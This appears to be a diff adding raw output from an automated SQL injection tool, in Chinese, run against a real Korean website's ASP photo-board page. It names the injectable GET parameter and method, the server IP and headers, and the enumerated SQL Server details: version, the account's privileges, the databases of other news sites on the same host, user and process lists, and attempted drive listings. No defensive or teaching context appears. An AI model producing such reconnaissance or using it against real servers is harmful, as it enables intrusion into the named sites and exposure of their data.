@@ -1,0 +1,161 @@
+■漏洞信息:============================================================
+ ·URL:http://www.hagwang.kr/news2/service/bbs/board.asp?P_BID=photo&P_Command=modify&P_Mode=&P_Page=&P_Index=212
+ ·页面标题：窍堡脚巩 - 窍巢, 堡林矫刮狼 措函瘤
+ ·参数:P_BID=photo&P_Command=modify&P_Mode=&P_Page=&P_Index=212
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:211.115.213.187
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Mon, 04 Apr 2011 10:08:50 GMT
+Server: Microsoft-IIS/6.0
+Content-Length: 55371
+Content-Type: text/html
+Expires: Mon, 04 Apr 2011 10:08:50 GMT
+Set-Cookie: ASPSESSIONIDAASRSTSC=CMJFLGBAFNBFKINOADABHKMH; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+- 数据库名：hagwangkr
+- 用户名：hagwangkr
+- 版本：Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Enterprise Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：LOCALHOS-7O3FR4
+- 服务名：MSSQLSERVER
+- 系统用户名：hagwangkr
+
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+busnodongorg	C:\Program Files\Microsoft SQL Server\MSSQL\data\busnodongorg_Data.MDF	
+cheonannews	C:\Program Files\Microsoft SQL Server\MSSQL\data\cheonannews_Data.MDF	
+cwhananewsnet2	C:\Program Files\Microsoft SQL Server\MSSQL\data\cwhananewsnet2_Data.MDF	
+demointerbestnet	C:\Program Files\Microsoft SQL Server\MSSQL\data\news1interbestnet_Data.MDF	
+domaintrendorg	C:\Program Files\Microsoft SQL Server\MSSQL\data\domaintrendorg_Data.MDF	
+fpeiorkr	C:\Program Files\Microsoft SQL Server\MSSQL\data\fpeiorkr_Data.MDF	
+gyonginkraetvkr	C:\Program Files\Microsoft SQL Server\MSSQL\data\gyonginkraetvkr_Data.MDF	
+hagwangkr	C:\Program Files\Microsoft SQL Server\MSSQL\data\hagwangkr_Data.MDF	
+hananewsnet	C:\Program Files\Microsoft SQL Server\MSSQL\data\hananewsnet_Data.MDF	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+SQLAgent - Generic Refresher	sleeping	LOCALHOS-7O3FR4	3500	AWAITING COMMAND	SYSTEM	
+SQLAgent - Alert Engine	sleeping	LOCALHOS-7O3FR4	3500	AWAITING COMMAND	SYSTEM	
+Internet Information Services	sleeping	LOCALHOS-7O3FR4	2600	AWAITING COMMAND		
+Internet Information Services	sleeping	LOCALHOS-7O3FR4	2600	AWAITING COMMAND		
+Internet Information Services	sleeping	LOCALHOS-7O3FR4	2600	AWAITING COMMAND		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+LOCALHOS-7O3FR4	SQL Server	SQLOLEDB	LOCALHOS-7O3FR4		LOCALHOS-7O3FR4	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+Dir of C:: 
+Dir of E:: 
+
+■数据库信息:============================================================
+- 数据库名：hagwangkr
+- 用户名：hagwangkr
+- 版本：Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Enterprise Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：LOCALHOS-7O3FR4
+- 服务名：MSSQLSERVER
+- 系统用户名：hagwangkr
+
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+busnodongorg	C:\Program Files\Microsoft SQL Server\MSSQL\data\busnodongorg_Data.MDF	
+cheonannews	C:\Program Files\Microsoft SQL Server\MSSQL\data\cheonannews_Data.MDF	
+cwhananewsnet2	C:\Program Files\Microsoft SQL Server\MSSQL\data\cwhananewsnet2_Data.MDF	
+demointerbestnet	C:\Program Files\Microsoft SQL Server\MSSQL\data\news1interbestnet_Data.MDF	
+domaintrendorg	C:\Program Files\Microsoft SQL Server\MSSQL\data\domaintrendorg_Data.MDF	
+fpeiorkr	C:\Program Files\Microsoft SQL Server\MSSQL\data\fpeiorkr_Data.MDF	
+gyonginkraetvkr	C:\Program Files\Microsoft SQL Server\MSSQL\data\gyonginkraetvkr_Data.MDF	
+hagwangkr	C:\Program Files\Microsoft SQL Server\MSSQL\data\hagwangkr_Data.MDF	
+hananewsnet	C:\Program Files\Microsoft SQL Server\MSSQL\data\hananewsnet_Data.MDF	
+happytimesorkr	C:\Program Files\Microsoft SQL Server\MSSQL\data\happytimesorkr_Data.MDF	
+happytodaykr	C:\Program Files\Microsoft SQL Server\MSSQL\data\happytodaykr_Data.MDF	
+historykr	C:\Program Files\Microsoft SQL Server\MSSQL\data\historykr_Data.MDF	
+hnhananewsnet	C:\Program Files\Microsoft SQL Server\MSSQL\data\hnhananewsnet_Data.MDF	
+ilgun	C:\Program Files\Microsoft SQL Server\MSSQL\data\ilgun_Data.MDF	
+jejusaramnet	C:\Program Files\Microsoft SQL Server\MSSQL\data\jejusaramnet_Data.MDF	
+jnnewscokr	C:\Program Files\Microsoft SQL Server\MSSQL\data\jnnewscokr_Data.MDF	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+SQLAgent - Generic Refresher	sleeping	LOCALHOS-7O3FR4	3500	AWAITING COMMAND	SYSTEM	
+SQLAgent - Alert Engine	sleeping	LOCALHOS-7O3FR4	3500	AWAITING COMMAND	SYSTEM	
+Internet Information Services	sleeping	LOCALHOS-7O3FR4	2600	AWAITING COMMAND		
+Internet Information Services	sleeping	LOCALHOS-7O3FR4	2600	AWAITING COMMAND		
+Internet Information Services	sleeping	LOCALHOS-7O3FR4	2600	AWAITING COMMAND		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+LOCALHOS-7O3FR4	SQL Server	SQLOLEDB	LOCALHOS-7O3FR4		LOCALHOS-7O3FR4	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+Dir of D:: 
+一次性获取失败，正在批次获取……
+Dir of D:: 
+一次性获取失败，正在批次获取……
